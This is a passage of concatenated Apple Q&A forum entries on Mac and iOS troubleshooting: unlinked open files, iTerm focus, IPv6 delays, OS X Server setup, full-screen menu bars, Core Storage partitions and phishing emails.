filesystem to see how many free blocks it has. The data blocks from the \"hidden\" files with no more directory entries are not free (there are still processes that can read/write them), so they still occupy space and will continue occupying that space until the last file descriptor that refers to them is closed\n\n*du lists directory entries and sums up sizes. It can't see these unlinked files, and will thus return less space used than the filesystem will.\n\n\nIf the files are on traditional disks, they continue to occupy disk space just like normal, still linked files. IO happens as normal. It doesn't have more main memory requirements/start eating RAM.\nIf the unlinked but open files are in a filesystem backed by RAM, then they continue to occupy memory, as they did before being unlinked. (In both cases the files can still grow/shrink too.)\nThe space will be reclaimed only when the last open file descriptor is closed. (Note that still open file descriptors get closed when a process exits or is otherwise terminated.)\n\nIf you attach a debugger to a program that is using unlinked files, you won't see anything particularly interesting. File IO calls will look exactly the same as for normal, still linked, files. Nothing special going on there. By inspecting what is read/written you might get some ideas about what the process is using these files for, but that's about it.\nAs for accessing these files, I'm afraid I don't know OS X enough to tell if there's an easy way. The fdesc pseudo-filesystem looks like it could be useful, but apparently only gives you access to the current process's files.\n\nA simple example of how a process can do this, in perl. (Can be done with just about any language, including shell scripts.)\nSetup and helper function:\n#! /usr/bin/perl\nuse strict;\nuse warnings;\nuse Fcntl qw(SEEK_SET); # for rewinding\n\nmy $fh;                 # file descriptor/handle\nmy $test_file = \"./test_file\";\n\nsub status {            # checks if the file is \"visible\"\n  my @st = stat($test_file);\n  if (@st) {\n    print \"$test_file: file exists\\n\";\n  } else {\n    print \"$test_file: error: $!\\n\";\n  }     \n}\n\nThe main part:\n# open file in read/write mode, creating it if it doesn't exist\n# (overwriting it if it does)\nif (!open($fh, '+>', $test_file)) {\n  die \"Failed to open $test_file: $!\";\n}\nprint $fh \"Some data before unlink.\\n\";\nstatus();\nunlink($test_file);\nstatus();\nprint $fh \"Some data after unlink.\\n\";\n\n# Rewind\nseek($fh, 0, SEEK_SET);\n# Print file contents\nforeach my $line (<$fh>) {\n  print \"read: $line\";\n}\n# Close\nclose($fh);\n\nExpected output:\n $ perl test.pl\n./test_file: file exists\n./test_file: error: No such file or directory\nread: Some data before unlink.\nread: Some data after unlink.\n\nYou can move the unlink around a bit (before or after the prints), won't change anything. There's nothing special about the file handle after the unlink, can be used as any other file handle (as long as it is kept open).\n", "Q: is it possible to open a file with commandline mate without focusing TextMate? Or if not, is there an easy way to return focus to iTerm/Terminal after opening a file/directory with mate?\n\nA: an osascript works, although the amount of time from calling mate until iTerm is refocused is somewhat annoying\nfocus_iterm () {\n  osascript -e \"tell application \\\"iTerm\\\" to activate\"\n}\nmateb () {\n  mate $@\n  focus_iterm\n}\n\n\nA: Preferences->Keyboard->Shortcuts will allow you to set a hot key to start terminal.

There are some tools critical to my workflow that talk to www.pivotaltracker.com using ruby.\nSome combination of updating from Ruby 2.1.2 to Ruby 2.1.3, recent os x system updates, and brew updates caused them to start taking a very long time to function, and the reason is ipv6, which I can see by using curl to make similar api requests: \n    curl -v -H \"X-TrackerToken: $TOKEN\" -X GET http://www.pivotaltracker.com/services/v3/projects\n    * About to connect() to www.pivotaltracker.com port 80 (#0)\n    *   Trying 2607:f700:1:1388:c856:ed01:e1bf:b0e0…\n\nafter a minute or two of timing out on all of www.pivotaltracker.com's ipv6 addresses, the ipv4 address is eventually tried, and the request completes sucessfully.\nThis is despite using sudo networksetup -setv6off Ethernet and verifying that ipv6 was \"off\" in Preferences>Networking. I've also tried putting a correct ipv4 entry in my /etc/hosts.\nIf I use curl --ipv4 the request completes immediately.

The keys in the auto_afp file are paths that are relative to the path specified in the top-level auto_master file.\nSo if your /etc/auto_master has: my/global/mount auto_afp\nThen your /etc/auto_afp should have: point -fstype=....\nFinally to get visibility into what automountd is doing, add AUTOMOUNTD_TRACE=2 to /etc/autofs.conf, watch /var/log/system.log with tail -f, and start navigating around your mount points.\n", "Q: How do I silence FaceTime notifications without silencing others? With FaceTime on my iPad now notifying me of iPhone cellular calls, it is important to be able to silence FaceTime notifications, without silencing others (such as alarms or reminders); but there appears to be no way to do this.\nHow do I silence — not disable, just silence — FaceTime notifications without silencing others?\n\nA: Either Settings > Notifications > FaceTime > Sounds > None or I have misunderstood your question. Do you mean to prevent the notifications from making noise or just dismissing a notification after its begun?\n\nA: The best you can do is configure the Do Not Disturb settings. You can set Allow Calls From to Everyone and then set Silence to either always or only while iPad is locked and you should still get notifications but they will be silenced.\n", "Q: Remove device from iCloud I sold my iPad (after restoring it and deleting all accounts/data), but it still shows up in iCloud settings under \"Devices\". Since I don't have access to the iPad anymore, how can I delete it from iCloud.com?\n\nA: First, contact the new owner, and ask him/her to enable Airplane mode.

You should now have the ability to click \"Remove from Account\".\n\n", "Q: How to delete photos from iPhoto album (not only removed from album)? In iPhoto, select some photos in an album, delete them only remove the photos from the albums (but are not actually deleted).\nHow can I delete photos (move to Trash) inside iPhoto albums (like deleting photos in Library > Photos view)?\n\nA: just right click click the trash icon and go to the column menu`s trash (the vertical menu left to your screen) and click on the top right empty trash.\nhope this helps.\n\n\nA: Select photos in an album, press option+command+delete.\n\nA: Easy.  When you open up your album, do a right mouse click on the image and the Trash icon appears. Just click that and the actual image is removed from the album but placed in the Trash as well.\n\n\nA: There's a trash can within iPhoto. To clear the space from your hard drive, you have to empty the trash can within the program. Click \"iPhoto\" next to the apple when the interface is selected. It's like the 4th option down. Then your hard drive will be restored. \n", "Q: How to get all my apps and data off iPhone 4s to new 5s I just recently bought an iPhone 5s but haven't set it up yet. Is there a way that I don't have to redownload everything onto my new phone?\n\nA: Yes, you can. As long as your iPhone 4S and iPhone 5S are using the same version of iOS. So first thing to do: Make sure your iPhone 4S has the same iOS version installed as your iPhone 5S. I would recommend upgrading both of them to iOS 8.\nWhen that is done, backup your iPhone 4S to your iTunes.  After you do that, then connect your iPhone 5S and choose to restore it from a backup. And that backup being the iPhone 4S backup you just made.\nThe other alternative if you do not have a lot of data is to backup your iPhone via iCloud and restore your iPhone 5S similarly.\n", "Q: Problems upgrading my iphone from iOS6 to iOS7 I have problems when I attempt to upgrade my iPhone from iOS6 to iOS7.

I like its usage. But as I understand, this app is not in App Store now, and the development of iSSH was ended. \nCould you please advise another SSH / VNC clients, which has the same usage? It would be great to see SSH and VNC features, like in iSSH. \nThere are some clients in the Store, and I checked famous RealVNC - I don't like its usage. Now I'm checking Team Viewer, but it's a separate app, which should be started on a desktop. \n\nA: Prompt, by Panic, seems to be the best thought-of iPhone ssh client. It's not a free app, though.\n\nA: Also check out Reflection (free) which has both iPhone and iPad versions. Unfortunately, it has no MOSH support and doesn't do VNC but its a solid SSH client.\n", "Q: All stills added to iMovie are blurry during playback I am desperately trying to finish this iMovie video for someone and I am having difficulty with the playback of my still images.

I've set up Siri integration with Remember the Milk on my iPhone 5s (I'm on iOS 8, but I used the iOS 7 instructions, as they haven't been updated yet). The connectivity seems to work fine: when I say, \"Remind me to go to the drycleaners\", \"Go the the drycleaners\" is added to my RTM list. However, when I say \"Remind me to Go the the drycleaners today\", the item ends up on my RTM list without a date. I also don't see any visual confirmation on my iPhone screen that it's attempting to add a date.\nAm I saying the wrong thing to Siri?\n\nA: The word 'today' doesn't register with Siri and reminders.  Reading through the documentation on Apple's support site I found this:\n\n  \n*\n  \n*If you enter “breakfast” or “morning,” Reminders sets a 9 a.m. notification.\n  \n*If you enter “lunch “ or “noon,” Reminders sets a 12 p.m. notification.\n  \n*If you enter “dinner” or “night,” Reminders sets an 8 p.m. notification.\n  \n*If you enter a day, but don’t enter a time, Reminders sets a 12 p.m. notification.\n  \n*If you enter a time, but don’t enter a day, Reminders sets a notification for today.\n  \n\nIt doesn't mention Siri, yet after some testing the rules seem close to the same for Siri input, although the times don't match. \nSolutions:\n\n\n*\n\n*Give Siri a time without a date. \n\n\"Remind me to go to the dry cleaners at 5pm\"\n\n\n*Give Siri a duration\n\n\"Remind me to go to the dry cleaners in 2 hours\"\n\n\n*Use \"evening\" and Siri will set the reminder for 6pm\n\n\"Remind me to go to the dry cleaners this evening\"\n\n\n*Use \"tonight\".

How could I do without using the mouse and clicking on the link?\n\nA: You can go through all links and controls in Safari using ⌥ Option+⇥ Tab. However, that's not ideal for Google. On Google, you can press ⇥ Tab and an arrow will appear next to the first result. You can then press the arrow keys to go up and down through the list.\nWhen you have selected the link you want (either through ⌥ Option+⇥ Tab or Google’s way) you can press ↩︎ Return to open the link in the current tab or ⌘ Command+↩︎ Return to open it in a new tab.\n\nA: ⌥⇥ + ↩︎\n⌥⇥ will iterate through all selectable items on a page and ↩︎ clicks the highlighted element.\n                         \nTo use ⇥ instead, go to Safari → Preferences → Advanced and select 'Press Tab to highlight each option on a webpage'.\n", "Q: Can I use Xcode to run previously purchased apps?

I never even had a chance to add any users.  Can't get it do do anything but crash.\nI haven't figured out how to restart it, I've followed instructions for resetting everything on the server app and received identical results.  \nUpon \"starting\" OpenDirectory it appears to start and then immediately stops.\nsudo changeip -checkhostname\n\nReports no issues.\nsudo launchctl unload /System/LIbrary/LaunchDaemons/org.openldap.slapd.plist\n\nTells me it is unable to unload.\nI'm completely lost.\nAs I mentioned I was never able to do ANYTHING with OpenDirectory, so if there's a way I can wipe and reinstall that'd be great.  I have no data to recover or backup.\n\nA: I had the same problem initially too. But for many months now, though, Open Directory has been working as expected and serves our many users' credentials reliably.\nIt was only after the following that Open Directory settled down:\n\n*\n\n*I was 100% sure that the OS X Server's DNS and reverse DNS was consistent, as viewed from within and without our network, and\n\n*that the DNS records matched exactly the domain name on the SSL Certificate we purchased.\n\nIf there are any inconsistencies between these, then the Server app just can't make all the assumptions about its identity that it needs to.\nIf all this sounds simple - we did not find it so.\nThis was our experience after several failed attempts and several attempts where we thought things were working but Open Directory flaked out. Yours will be different e.g. if your OS X Server is not internet-facing:\n\n*\n\n*Important Note: All this had to be done on OS X before the Server app was installed successfully and running reliably. This will require special attention if you bought a Mac Mini with Server included. You have to get the OS X identity issues sorted before you go ahead with the step of installing the OS X Server app. It's installation is quite brilliant ... if all its (few) assumptions are met; but can cause a right mess if they aren't!\n\n*I had to double and triple check before I realised that I had not told the people selling me our fixed IP Addresses (BT in the UK) the correct FQDN to resolve reverse DNS to.\n\n*We decided to use OS X Server's DNS to manage all the domains we manage. So, in the case of our Server's FQDN, we had to tell BT to delegate the DNS to our OS X Server's IP Address.\n\n*These interactions with external parties can take from many hours to a few days and should be completed to your satisfaction before you unwrap the Server app. Don't expect instant installation of Server until this is all sorted.\n\n*I had to play games with the router to have OS Server's external FQDN name on the local network. In our case (BT Business Hub 3) we had OS X connect to the router with DHCP but the router was set to give OS X the correct external fixed IP Address. This is a quirk with this particular router. Normally you are recommended to use OS X System Preferences Network Settings a fixed IP address; in our case we had to allow the router to give it a fixed IP address.\n\n*All this had to be done before OS X Server was installed successfully\n\nAn ideal place to start\nThe perennial advice - that still stands - is to start by running sudo changeip -checkhostname\n(Although, ironically, I don't think changeip is there until afer you've installed Server ... so maybe it's only ideal after you've already got things right!)\nWhen you can: run sudo changeip -checkhostname make sure you get the response:\n\n...\nThe names match. There is nothing to change.\ndirserv:success = \"success\"\n\nand make sure that Current HostName value == the name on your SSL Certificate == the name on the front page of the Server app GUI\nOpen Ports\nAnother thing: ensure that your Server can be reached by the ports that it needs.

In fact, I would zero the hard drive. \nIf you have dual hard drives, I strongly recommend RAID 1 (Mirroring)\nIf you follow these instructions, OS X Server, especially Open Directory will run well:\nReinstall OS X\nBEFORE you install OS X Server, be sure to do the following:\nChange the name of your Startup Volume NOW (if you want to change it). \nName your computer and enable remote management (System Prefs > Sharing)\nSet Energy Prefs to \"Never Sleep\"\nAssign a fixed/manual IP address to the Ethernet interface\nDisable all other network interfaces\nMake sure you have a real domain name.

Don't use .local\nIf your Mac mini will not also act as the DNS server, you must have forward and reverse DNS entries on another DNS server for the Mac mini (should match the computer name you set up.) Make sure this DNS server is listed in your network settings.\nMAKE SURE you have an active Ethernet connection (even if it's just to a switch connected to nothing else) BEFORE you run Server.app\nNOW you can install and run Server.app to set up OS X Server on your Mac mini.\nSet up your server as if it will be accessible from the Internet, using a fully qualified Domain Name, NOT .local or .private\nIF you are not using another DNS server on your network.\n- Set up DNS \n- After the Server.app set up, DNS should be running.\n- In your Network preferences, remove all DNS server entries except 127.0.0.1, which was added by Server.app.\nAll of these steps are best practices (even if not fully documented).

Do not tell me to use this shortcut CTRL + COMMAND + F to exit or enter in the fullscreen mode. I would like to always see the menu bar in the top of the page when I am in fullscreen mode, is it possible? \nThis Mac default style is completely annoying.\n\nA: SOLVED!\nThe way I did this was:\n\n*\n\n*Go to SystemPreferences -> Dock -> Check the AutomaticallyHideAndShowTheDock\n\n*Instead of ClickingTheGreenButton to use 'default' FullScreen, you must do:\nOption + ClickTheGreenButton.\n\nHope it helped you! :D\n\nA: The problem with the suggestions people are offering is that they are NOT full screen mode. When you resize a window it takes over the desktop rather than becoming a separate pane. I like to toggle between screens using a four finger swiping motion on the magic trackpad (the way you do on an Ipad), or alternately, press command ⌘+TAB. You know how. If the apps are not in TRUE full screen, then they appear as part of the desktop screen and you can't toggle between them. You have to minimize one to find the other one beneath it, then bring it back up using the dock. I've lost pages that way when I have more than one screen from the same program open (like two spreadsheets, pdfs, or Word documents). Even when you go to Mission Control only one screen appears, that of the desktop. I sympathize with them. I hate that you can't have full screen and still see the menu.\nThe only thing I can suggest to you (just figured this out now) is to try to replicate some of the stuff from your menu bar onto the dashboard and then have a hot key for the dashboard. I suggest the blank F5 key. This will be as close as you can get to bringing up the menu bar with a single press as I can imagine. And you can just as quickly make it go away.\n\nA: Answering a question within 5 years of the question being asked was considered fast turnaround in ancient times. So...\nThe only way to do this is this:\n1- Create a new desktop (slide three fingers up, click on the + on top right corner to create a new blank desktop)\n2- Un-maximize (Microsoft language: restore) the window or app in question.\n3- Drag the window all the way up until all the desktops show at the top.\n4- Place the window/app in the desktop you just created.\n5- Press Option and click on the green/maximize button of the on the top left corner of the window/app.\nThe window/app will maximize in that desktop with the menu showing on top as desired (only if the options is unchecked in System Preferences > General > Automatically hide and show the menu bar).\n\nA: Go to System Preferences > Dock and Menu Bar, uncheck the box Automatically hide and show the menu bar in full screen.\nAfter unchecking the box, refresh your app by exiting full screen and entering it again.\n\nA: I don't think it can be done.\nBy default, the menu bar will float in if you hover the mouse at the top.\nAlternatively, why not just use the window maximised, which will give a very similar look to what you want. [Green dot, top left of any window - though some apps will toggle full screen horizontally & vertically, others only vertically, you'd have to drag the corner for those]\nUpdate for Yosemite, the green button behaviour is now reversed from Mavericks & before…  \n\n\n*\n\n*Green dot will set to fullscreen, without the menu bar.  \n\n* Alt ⌥  /Green dot will maximise, leaving the menu bar visible.\n\n\nA: In Safari, enable View → Always Show Toolbar in Full Screen.\n                         \n\nA: My husband showed me how to make it always show up.\nOpen up your browser and float at the top to get the tool bar.\nClick on View, and then \"Exit Full Screen.\"  \nIt will make your browser window half the size of what you will want.  \nThen use your mouse to put the arrow on the right side of the window and pull it to fill in the right side.\nDo the same on the bottom. And any adjustments you want on the top.    \nNow, quit your browser.\nWhen you re-open it, it should remember and be the exact size you want - with the menu bar in full view.  \n\nA: I just figured the solution! You need to adjust the screen in the maximize screen as everyone said but also, click hide on the bottom bar and hide it, that way you get a larger portion of the screen and keep the menu bar on top showing.\nI like the menu bar because it keeps showing the time and battery. Not sure how you can live without seeing those two all the time...\n\nA: I observed this phenomenon and let me try to explain the rationale behind this.\nThink of full-screen mode as a full-screen mode of a video on a youtube.\nyou wouldn't want any menu bar appearing on that full-screen while watching any video.\nSimilar is the logic behind the disappearance of the menu bar while in full mode of any application.\nthe only other option is to maximize the application to view the menu bar.\nAdditionally, mac allows the reappearance when hovered on the top instead of exiting the full-screen mode. This is an added feature when observed from this logic.\nI hope, I have answered the logic behind the disappearance of the menu bar with my observation.\n\nA: Hold down on the option/alt key while clicking the green dot in the upper left hand corner.\n", "Q: iCloud back up on iPhone 5c If I back all my data on to iCloud will this free my memory on my phone as I only have 8GB and would like more pics songs etc , hope people can help! \n\nA: Backing up to iCloud is only a backup, it will not free up space on your iOS device.. you'll need to free up space manually.\nYou can find more information on iCloud storage and backup overview here:\nhttp://support.apple.com/kb/PH12519?viewlocale=en_US&locale=en_US\n", "Q: Desktop files and folders always moving In OSX 10.9.5 my desktop folders re-arrange when a new window is opened.

Once I decided to remove Yosemite and go back to Mavericks, I am not able to claim the free space partition in the Disk Utility. How can I reclaim this partition?\n\nA: I read a lot of blogs, tried different commands and finally got it fixed.\n\n\n*\n\n*Reboot your Mac in Recovery mode using Command+R key combination during the boot up.\n\n*Start Terminal application from the recovery boot\n\n*Run command, diskutil cs list\n\n*See the last Logical Volume name, 76A3020B-B3C2-4905-9E09-2EBB5470261C\nUse that in next command.\n\n*diskutil cs revert 76A3020B-B3C2-4905-9E09-2EBB5470261C\nThis should convert the CoreService Logical Volume to a Normal Disk partition.\n\n*Run command, diskutil cs list now, and you should receive message that no CS volumes.\n\n*Now, Reboot your MacOSX normally and once you login, start Disk Utility and resize your main partition \"Machintosh HD\" to claim all free space.\n\n\nA: grg's answer worked for me, but I'll add some info. Had a problem installing Win10 on a MacBook A1502. It didn't want to install on a Bootcamp partition (GPT problem), then i deleted the bootcamp partition and tried to install win10 into the free space. After this, i was no longer able to boot my MBP under MAC OS - it simply didn't see the system. By the way, Macintosh HD partition decreased in size to 54GB. The second partition was empty (exactly like \"empty space\") and unable to be attached to Macintosh HD (I mean, Macintosh HD partition was impossible to expand to 121GB). I tried backing up with Time Machine, but it said it cannot restore the system due to lack of space (lol). I tried reinstalling Mac OS (all in Cmr-R), but it said the same. DiskUtility in \"Emergency\" utilities (I mean, accessible with Cmr-R) could not attach the free space to Macintosh HD. I pressed \"+\" and selected all of the file systems, but nothing happened.\nTerminal did the work. Once you type diskutil cs list, you will see lots of logical storages. Please note that they may have different format (for 76A3020B-... there are two digits first), that will save you time. If you try to revert the wrong partition (not with two digits first), you will get an error.

The accepted answer will open the previous directory every time you open a new tab, which I personally find frustrating. I feel it's easier to always open in the home directory and then open the current directory in a new tab as needed.\nTo do that, simply run the following command:\nopen . -a iterm\n\nThat will open the current directory (open .) using the application (-a) that most closely matches iterm. \n\nA: Select \"Reuse previous session's directory\" from the preferences of your profile:\n\nAlternatively click on \"Advanced Configuration\" then \"Edit...\" so you can set the working directory separately for new windows, new tabs & new split panes\n\n\nA: If you've just set \"Reuse previous session's directory\" and the change doesn't seem to be taking effect, it's worth noting that the new changes will only apply to tabs / panes that get opened after you've chosen this setting.\nFor example:\n\n*\n\n*Let's say the current setting is: \"Home Directory\", and you have a tab open (tab #1)\n\n*You go to \"Preferences\" and change to \"Reuse previous session's directory\"\n\n*If you open a new tab (tab #2) while on tab #1, it will still use the previous settings\n\n*However, if you open another tab (tab #3) while on Tab 2, it will respect the new configuration\n\n", "Q: Save downloaded file to iCloud Drive with Safari on iOS8 I would like to download a simple text file using Safari on my iPad and save it to iCloud Drive.

Apart from the read / write and startup time improvements, do they improve the Spotlight index time of your machine as the image below or is this a process that is carried out by the CPU so a new hard drive wouldn't improve it? \n\nA: Quite simply, SSDs do everything faster.\nTheir downside would appear to be a limited read/write cycle lifetime, but so long as you're comprehensively backed-up, I wouldn't see that as an issue.\nAdding a Samsung EVO 1TB as the boot drive to my Early 2008 Mac Pro has given it life I didn't know it had left in it.\n", "Q: identifying devices using find my phone app I will try to be specific.\n- I did receive this e mail:\nDear XXXXX, \n    Your Apple ID (XXXXXXX) was used to sign in to the Find My iPhone app on a new device. \n    Date and Time: October 6, 2014, 3:39 AM PDT \nDevice: iPhone 5s \n    If you recently signed in to the Find My iPhone app, you can disregard this email. \n    If you have not signed in to Find My iPhone recently or you believe someone may have accessed your account, go to My Apple ID (https://appleid.apple.com) and change your password as soon as possible.\n    Apple Support \n\n\n*\n\n*I am not the possessor of the quoted device, though the apple id + password are the right one\n\n*this means someone else entered my find my phone app using my credentials to track me (probably boy friend!!)\n\n\n(i did already change my password, of course and already asked the apple care and they told me there's no way to track the device..)\ncan I somehow track (identify) the possessor of the device used to enter my apple id app?\n\nA: In general, no. Apple won’t tell a consumer about another consumer’s details.\nIf you followed the advice of the email and changed your password after the time of the alert, then you have done what you need to secure your privacy.\nIn the past, Apple didn't send those emails and there was no easy way to know if someone had gotten a hold of your AppleID and your password for the ID.\nIt could be someone who is trying common passwords and stumbled across your account by chance to use it for fake reviews on the app store or it could be someone who you know and they guessed or were provided the password when you trusted them.\nThere's no way you can track things unless you were to get a law enforcement order sent to Apple's legal department and even then, you might not be able to get a satisfactory answer as to who accessed your account.

One official and one for guests (which is also used to connect to for privat devices like iPhones). I have the same Apple ID and keychain access configured on my private iPhone and the MacBook. \nThere is a order of WIFIs in the settings to which the device will connect to first. I want to connect the iPhone to the guest WIFI, but the MacBook to the official WIFI. The order of the WIFIs is also synced and changing one will always effect the other one.\nIs there a way to disable sync of the order or of a specific WIFI?\n\nA: I had the exact same problem, and I found this solution to work pretty well for me: By creating a profile that you install into your iPhone, you ensure that only the iPhone will know about the guest network.\nHere are the instructions:\n\n\n*\n\n*Install the official \"Apple Configurator app\" on your Mac-Book: https://itunes.apple.com/app/apple-configurator-2/id1037126344\n\n*Create a new Profile: Go to File -> New Profile -> Wifi -> Configure\n\n*Enter the name (SSID), password and security settings for the guest network. You may want to check the Auto Join option.\n\n*Save the profile File -> Save...\nNow delete references to the Guest network from both your Mac and your phone.\n\n\n*\n\n*Finally connect your iPhone to your Mac and install the newly created profile into your iPhone. File -> New Window -> Select your phone -> Click the green + icon -> Profiles\nNow only your iPhone will have knowledge of the guest network and your MacBook will never try to connect to it.\nIt's also working well in the other direction: Once connected to the Guest network through the profile, my phone will never try to connect to my enterprise network even if it's saved in the keychain. Although I can't explain why .. but this seem to do the trick !\n\nA: I've come across the same issue. What i did was merely state forget this network (In this case the non guest one) on my iphone.\nYou can easily do this by navigating to Settings->Wifi->Official WIFI->Forget This Network.\nKeychain wont do this on the Mac though. there the order is defined by the Network settings.

Although I like the new iTunes Connect interface, there's a massive let down on my app: it will ask for my encryption compliance form each time I submit a new binary.\nIn the \"old\" iTunes Connect website, it was only asking if the encryption scheme changed (and required a new form, which is understandable), here I have to provide it for every single binary I want to submit.\nThis slows down the validation process for about 3-4 days each time, which is really frustrating.\nDoes somebody have the same issue?\nIs there a solution to skip this step ?\n\nA: Each submission could end up live on the store and each change could have export implications.\nYou could not update things if it's a hassle to do the paperwork, but I don't see any chance that this will be relaxed due to the severity of the penalties Apple would face if they didn't ask and a developer did add content that needed to be classified according to U.S. Law.\n", "Q: Is it possible to install an old version of Mac OS on a new Mac? I know that Apple doesn't want me to run a version of Mac OS older than the one my Mac came with, but is there a way around this?  For example: if I buy a new Retina MacBook Pro, is there a way to run OS 10.6 on it without a VM?\n\nA: Think about it this way, OP.  When Snow Leopard was released in 2009, it had no way to know how to \"talk\" to a 13\" MacBook Pro Retina which would be released 4 years later.  It doesn't know how to drive the video card, the network card, even the logic board to some extent.  You would rightly expect kernel panics and other weirdness.\nThat said, you can still run 10.6.x in VMware, Parallels, or VirtualBox.\nI know a lot of people greatly miss the days of Snow Leopard, but give Mavericks and Yosemite a chance.  I am currently running the Yosemite GM on all four of my Macs, it runs very well on a 2012 MBPr.  They are incredibly stable, and they have introduced a significant number of improvements over Mountain Lion, Lion, and Snow Leopard.\n\nA: A new Mac will have trouble running previous releases.  The older releases won't have necessary drivers for the newer hardware.\nHowever, there are two things that might make it possible:\nFirst, a newer machine might be using older hardware that the older OSX does support. Try it out.\nIf you treat your new hardware as a non-Apple PC, you can follow various \"hackintosh\" tutorials to install older versions of OSX onto it, provided that you can resolve driver dependencies.  This will still be difficult, but there are resources to make it work.\nTypically, though, when you want to run an older release, you find an older machine that the desired release supported, and you buy the older machine. I ended up doing this in order to support OSX Tiger (10.4) for a specific project when all the new machines supported Snow Leopard(10.6).  Depending on how much your time is worth, it might be a better choice than making your system work with the older release.\n\nA: It's not directly that Apple doesn't want you to do so, it's more that older OS versions are lacking the drivers etc. required for hardware which wasn't even known at the time the older OS was released. The most obvious example for this in your case is the Retina display (and the graphics driver required for it), there are probably a lot more parts including the CPU which require special handling by the OS.\n\nA: Some days ago I discovered that installing an older version of mac is possible, but no one did it. The problem is in the EFI Bootloader Volume, if you have your mac from 2010 you have an EFI Controller Chip with version for example 1.6 (like BIOS in PCs) already installed in the logic board that supports an old System Drivers, but if you have a New Mac so EFI had been updated to the newer version (Again like in BIOS- bios os 1.6 in 2010 and bios 2.0 in 2014) it would be a terrible headache! if you bought mac in the end of 2013 and your primary OS was OS X 10.9 Mavericks, you can install only this OS(you can update and downgrade between the newer version or Pre installed OS) , because otherwise EFI will block an oldest version of OS X such as 10.7x or 10,8x! I had an idea to make my own EFI downgrade with support of 10.8 and so more, but it is a bit difficult to do that because firstly you must have an old OS X and only then the EFI Bootloader. Nowadays Apple started updating their EFE by installing Yosemite, and i think that is so stupid, because I started having troubles with my computer even though OS loading faster then on the old version of Loader\nP.S.

From that point, you can download the older OS from the App Store (AppleCare may have to issue you a redemption code for that build if you don't have it for your Apple ID).\nFrom there, you can partition your internal drive and install Mountain Lion on a separate partition or install it onto a USB drive.\nAt that point, you can restore your data and settings on to Mountain Lion and/or wipe the internal drive booting off the external to finally install Mountain Lion as the only OS on the internal drive.\nIt's a bit of an exercise, but you can ask here or from Apple for guidance on each step along the way if you get lost.\n", "Q: Apple Care email + payment request Just got this email.\nDid not open the link (since the price looked ridiculous).\n\nThe link would lead to a look a like the Apple Log In window.\n\nWhat is up with that? someone trying to collect Apple ID information for next stage of criminal activity.\nIt looks like (bad) SCAM to me!?\n\nA: Wouldn't trust it as far as I could spit it.\nBut don't ignore it - that just lets them keep doing it to other people for longer.\nForward the email to reportphishing@apple.com\nas per this Apple KB article - Phishing & Other Suspicious Emails\nI recently learned that many of the spelling & grammatical mistakes in such phishing attempts as this are specifically designed to keep 'smart people' away & prey only on the less savvy.\nA cruel way to think.\n\nA: The fact that the email originates from csparks@pineland.net, and the misspelling (responsinility) and grammar mistake (\"In case of not paying\") tells me it is a SCAM. \nDelete and move on.\n", "Q: Mark phone number as 'cannot receive iMessages' iOS 8 & 7, iPhone 5S\nI have one phone number my iPhone insists ought to be iMessage-capable.

If the problem is not the hardware, not something in my user account and not something in the operating system, what else could it be?\nUpdate 2: I managed to get most of my computer backed up to an external drive, then booted a different computer from that drive. I was able to run through all the affected apps and tasks with no problems. So that makes it seem like a hardware problem, although something that only became apparent after installing OS 10.9.5. I've made a Genius Bar appointment for next week to see if they can diagnose it. If a new hard drive or memory chip would solve my problems, I'd be happy.\nUpdate 3: I took my computer to the Apple Store, and the Mac Genius thought the problem was either with the memory chips or the memory slots. She offered to run a more thorough memory test, but I'd have to leave my computer for 24 hours for the test and another 3-5 days if the problem was with the slots. I had some different memory chips at home, so instead, I took the computer home and swapped the memory. The problems continued. I think the next step is to leave it with the Genius Bar for a likely hardware repair.\nUpdate 4: My computer passed the memory test at the Apple Store, but failed the hard drive test. That's actually one of the first things I thought of when the problem started, because I have often seen hard drive failures after about two years of use, but I read a little about SSDs and got the impression that when they failed, they failed suddenly and totally. I'll order a new hard drive and will post a final response if that fixes the problem.\nUpdate 5: Strangely, since the diagnosis of a failed SSD, I haven't seen the problem again. To get a second opinion, I bought a hard drive test application and it said the hard drive was fine and not far into its expected lifespan. I don't want to replace the SSD if I don't have to, and this is no longer my main computer because I ended up buying a new one to avoid the downtime this problem was causing me. So I guess I'll just leave it as is. What a mystery.\n\nA: You seem like an advanced user (a few developer apps), so forgive me for stating the seemingly obvious, but you did ask… A reasonable course of action would be to try these in the order given (least disruption & work -> most).\n1) Use Utilities>Disk Utility to:\n\n\n*\n\n*check/repair permissions on the start up volume \n\n*verify/repair the SSD volume \n\n\n2) If you have it, use Disk Warrior to check/re-build your disk directory. \n3) If neither of those turn up anything &/or don't fix the problem(s) then you could try re-installing using the 10.9.5 Combo Updater.\n4) If you still have problems then perform an (extended) Apple Hardware Test which can be accessed on the install media that (should have) came with your Mac. It sounds like your Mac is old enough to have still come with install DVDs. Whatever media you have (including none), shutdown, disconnect everything but the mouse & keyboard and then startup holding down the 'D' key.\nIf you have another h/w checking utility (e.g. AppleJack>MemTest, Tech Tool Pro) then try it.\n5) If nothing comes of that, then I'd do a clean re-install (after making a complete backup of your Mac). Then use Migration Assistant to transfer your data from the backup media to your Mac's SSD volume(s).\nIf it's still not fixed, you should probably get it serviced (or I would).\nI haven't explained any of these steps in detail 'cause I think you should be able to do them all with help from Google and you may have already done some or all of them, in which case I again apologise. I'm only suggesting these because you hadn't said what you'd already done and I don't know if there's any assumption on here of what you would have done before asking a question like this.\nHope this helps!\n\nA: I have the same problem, although it mostly occurs when I put an older, potentially faulty DVD in the drive - VLC locks up and refuses to start and I have to reboot, but its also happened with TextEdit, Disk Utility, etc. The behaviour of the applications is the same - you can't kill them, either using the Dock, Force Quit or even sudo kill -9.

I also discovered that, after a DiskWarrior run, if I started in safe mode and ran the machine for a couple of days, when I returned to regular mode, the freezing problems had disappeared. BTW safe mode disables sound.\n", "Q: Mac Mail - move IMAP message to Exchange folder In Mac mail I have most of my email accounts set up\nHotmail, Gmail, Yahoo, and Exchange (office365 hosted).\nWhen I try to move any of my messages from the first 3 (all IMAP accounts) into my Exchange Folder (where I archive everything), it gives me the error can't move message.\nIs there any solution?\n\nA: I don't know what is causing the error, but I can tell you where on the filesystem you can find your messages. Perhaps you can move them manually in Finder?\nThe default location for mailboxes is:\n~/Library/Mail/V2/\nin Finder, choose Go To Folder from the GO menu or use the shortcut ⬆︎⌘G and paste that path into the dialog box.  That folder should contain folders for each of your mail accounts, each containing mailbox folders with labels like INBOX.mbox which are simply folders themselves. You'll likely have to traverse down several levels of folders with arbitrary names before you reach a Data folder containing a Messages folder which is where you will finally find your email messages.

